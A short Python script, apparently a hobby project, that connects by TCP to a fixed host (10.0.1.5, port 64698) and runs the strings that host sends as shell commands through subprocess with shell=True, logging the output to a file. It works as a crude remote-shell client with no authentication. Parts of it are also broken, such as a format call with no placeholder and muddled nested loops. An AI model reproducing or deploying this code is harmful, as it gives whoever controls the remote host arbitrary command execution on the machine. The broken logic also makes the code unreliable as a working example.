import socket
import sys
import subprocess

TCP_IP = "10.0.1.5"
PORT = 64698
BUFFER_SIZE = 1024

sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
sock.connect((TCP_IP, PORT))

print("Connexion on : ".format(PORT))

msg_recu = b""
while msg_recu != b"FIN":
    msg_recu = sock.recv(BUFFER_SIZE)
    msg_recu_str = msg_recu.decode()
    print(msg_recu.decode(), end='')

    x = input("> ")
    x = bytes(x, "utf-8")
    sock.send(x)

    data = sock.recv(BUFFER_SIZE)
    print(data.decode(), end='')
    w = input("")
    w = bytes(w, "utf-8")
    sock.send(w)
    
    while msg_recu != b'':
        with open('test_client.log', 'w') as f:
            p = subprocess.Popen(msg_recu_str, stdout=subprocess.PIPE, shell=True)
            for line in iter(p.stdout.readline, ''):
                line_str = str(line)
                sys.stdout.write(line_str)
                f.write(line_str)
                f.flush()
                    
                if line == b'':
                    data = sock.recv(BUFFER_SIZE)
                    break
            f.close()
            break

    if(msg_recu_str == "Client Disconnected"):
        print("\nBye !")
        break

    """x = input("")
    x = bytes(x, "utf-8")
    sock.send(x)"""

sock.close()



